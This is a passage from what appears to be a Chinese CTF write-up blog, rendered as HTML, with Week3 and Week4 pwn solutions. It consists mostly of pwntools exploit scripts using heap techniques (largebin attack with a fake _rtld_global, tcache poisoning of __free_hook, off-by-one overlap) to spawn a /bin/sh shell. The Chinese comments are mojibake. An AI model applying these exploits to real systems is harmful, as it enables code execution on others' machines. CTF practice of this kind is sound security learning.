class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = ((flag[i] ^ encflag[i]) + key[(i+<span class="number">1</span>)%<span class="number">6</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)        </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(flag[<span class="number">31</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="week3">Week3</h1>
<h2 id="pwn---ä¸€è¡€">Pwn - ä¸€è¡€</h2>
<h3 id="eldenring3">EldenRing3</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;106.14.57.14:30208&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">Index,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">Index,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x500</span>,payload) <span class="comment"># avoid annexing</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">main_arena  = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x01</span> - <span class="number">0x60</span></span><br><span class="line">libc_base   = main_arena - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">large_bin   = main_arena + <span class="number">0x60</span> + <span class="number">1072</span></span><br><span class="line">rtld_global = libc_base + <span class="number">0x21b040</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x5f0</span>,payload)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">alloc(<span class="number">2</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">alloc(<span class="number">3</span>,<span class="number">0x5f0</span>,payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">alloc(<span class="number">4</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">alloc(<span class="number">5</span>,<span class="number">0x500</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x500</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">heap_base = u64(io.recvuntil(<span class="string">&#x27;\x0A&#x27;</span>)[-<span class="number">6</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_base    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x500</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x511</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x528</span>,payload)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x508</span>,payload)</span><br><span class="line">alloc(<span class="number">2</span>,<span class="number">0x518</span>,payload)</span><br><span class="line">alloc(<span class="number">3</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">4</span>,<span class="number">0x538</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;rtld_global1    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(rtld_global))</span><br><span class="line">rtld_global = libc_base + ELF(<span class="string">&#x27;ld-linux-x86-64.so.2&#x27;</span>).sym[<span class="string">&#x27;_rtld_global&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;rtld_global2    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(rtld_global))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;n 280&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(rtld_global - <span class="number">0x31028</span> - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">alloc(<span class="number">5</span>,<span class="number">0x600</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;n 280&#x27;)</span></span><br><span class="line"></span><br><span class="line">fake_rtld_global = heap_base + <span class="number">0xcd0</span> + <span class="number">0x10</span></span><br><span class="line">one_gadget = [<span class="number">0xdf54c</span>, <span class="number">0xdf54f</span>, <span class="number">0xdf552</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">  one_gadget[i] += libc_base</span><br><span class="line"></span><br><span class="line">fake_rtld_global = heap_base + <span class="number">0xcd0</span></span><br><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(fake_rtld_global)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x58</span>) + p64(<span class="number">0x8</span>) + p64(one_gadget[<span class="number">0</span>])</span><br><span class="line">payload  = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x40</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x48</span>) <span class="comment"># 0x128</span></span><br><span class="line">payload  = payload.ljust(<span class="number">0x30c</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x1c</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x500</span> + p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;n 279&#x27;)</span></span><br><span class="line"></span><br><span class="line">next_node = rtld_global - <span class="number">0x31028</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main_arena     ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(main_arena))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base      ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;rtld_global    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(rtld_global))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;next_node      ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(next_node))</span><br><span class="line"><span class="comment"># print(&#x27;set_context    ---&gt;   &#x27;,hex(set_context))</span></span><br><span class="line"><span class="comment"># print(&#x27;ret            ---&gt;   &#x27;,hex(ret))</span></span><br><span class="line"><span class="comment"># print(&#x27;pop_rdi        ---&gt;   &#x27;,hex(pop_rdi))</span></span><br><span class="line"><span class="comment"># print(&#x27;binsh_addr     ---&gt;   &#x27;,hex(binsh_addr))</span></span><br><span class="line"><span class="comment"># print(&#x27;system_addr    ---&gt;   &#x27;,hex(system_addr))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xdf54c execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdf54f execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdf552 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># loadfolder /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/.debug/.build-id</span></span><br></pre></td></tr></table></figure>
<h3 id="ä½ æ»¡äº†é‚£æˆ‘å°±æ¼«å‡ºæ¥äº†">ä½ æ»¡äº†,é‚£æˆ‘å°±æ¼«å‡ºæ¥äº†!</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;139.196.137.203:32320&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">Index,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x17</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x88</span>,payload) <span class="comment"># 0 unsortedbin overlap</span></span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x18</span>,payload) <span class="comment"># 1 tcachebin poisoning</span></span><br><span class="line">alloc(<span class="number">2</span>,<span class="number">0xf8</span>,payload) <span class="comment"># 2 trigger chunk</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0x88</span>,payload) <span class="comment"># 3-9 tcachebin 0x88</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># chunk0 -&gt; unsortedbin</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xb0</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0xf8</span>,payload) <span class="comment"># 3-9 tcachebin 0xf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">15</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span></span><br><span class="line">libc_base = main_arena - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line"><span class="comment"># one_gadget = [0x4f2a5, 0x4f302, 0x10a2fc]</span></span><br><span class="line"><span class="comment"># for i in range(len(one_gadget)):</span></span><br><span class="line"><span class="comment">#   one_gadget[i] += libc_base</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x21</span>) </span><br><span class="line">alloc(<span class="number">15</span>,<span class="number">0xa0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># put chunk8 into tcachebin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0xf0</span>,payload) <span class="comment"># 3-9 0x100 tcachebin</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">14</span>,<span class="number">0xf0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 3-9 0x100 tcachebin</span></span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0xa0</span>,payload) <span class="comment"># 3-9 0xb0 tcachebin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 3-9 0xb0 tcachebin</span></span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x21</span>) + p64(free_hook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0xa0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;free_hook   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">15</span>,<span class="number">0xa0</span>,payload)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">alloc(<span class="number">14</span>,<span class="number">0x18</span>,payload)</span><br><span class="line">payload = p64(sys_addr)</span><br><span class="line">alloc(<span class="number">13</span>,<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive(pre=<span class="string">&quot;ls\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="week4">Week4</h1>
<h2 id="pwn-1">Pwn</h2>
<h3 id="eldenring-final">EldenRing Final</h3>
<p>å¼€å­¦ä¸€ç›´æ²¡æ—¶é—´æ‰“ï¼Œæ¯”èµ›ç»“æŸäº†å¤ç°ä¸€ä¸‹è¿™é“é¢˜ï¼Œåªå¤ç°åˆ°äº† leak stderr
çš„éƒ¨åˆ†ï¼Œåé¢çš„éƒ¨åˆ†å°±åªæ˜¯ overlap + fastbin æ‰“ malloc_hook</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹ç»“æ„ä½“</span></span><br><span class="line">p *(struct _IO_FILE*)_IO_2_1_stderr_</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;139.196.137.203:32320&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocPage</span>():</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># ç”Ÿæˆä¸¤ä¸ªç›¸è¿çš„0x20å¤§å°çš„chunk</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletePage</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;which page?\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line"><span class="comment"># free æ‰ç¬¬ä¸€ä¸ª0x20å¤§å°çš„chunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocNote</span>(<span class="params">pageID,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27; attach to?\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(pageID))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;size:\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;content:\n&gt;\n&#x27;</span>, content)  </span><br><span class="line"><span class="comment"># ç”Ÿæˆä¸€ä¸ªsize = 0x20çš„chunkï¼Œå†ç”Ÿæˆä¸€ä¸ªsize &lt;= 0x100çš„chunkï¼Œè¿™é‡Œæœ‰off-by-one</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleteNote</span>(<span class="params">pageID,noteID</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;which page_ID?\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(pageID))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;which note_ID would you like to delete?\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(noteID))</span><br><span class="line"><span class="comment"># å…ˆ free æ‰ åç”Ÿæˆçš„chunkï¼Œå† free æ‰å‰ç”Ÿæˆçš„chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">is_dbg</span>):</span><br><span class="line">  <span class="keyword">if</span> is_dbg:</span><br><span class="line">    gdb.attach(io,gdbinit)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">name,value</span>):</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125;   ---&gt;   &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(value)))</span><br><span class="line"></span><br><span class="line">gdbinit = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  b *0x400B69</span></span><br><span class="line"><span class="string">  b *0x400B6E</span></span><br><span class="line"><span class="string">  c</span></span><br><span class="line"><span class="string">  record</span></span><br><span class="line"><span class="string">  c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = process(file)</span><br><span class="line">    <span class="comment"># å½’å¹¶ä¸èƒ½writeçš„chunk</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    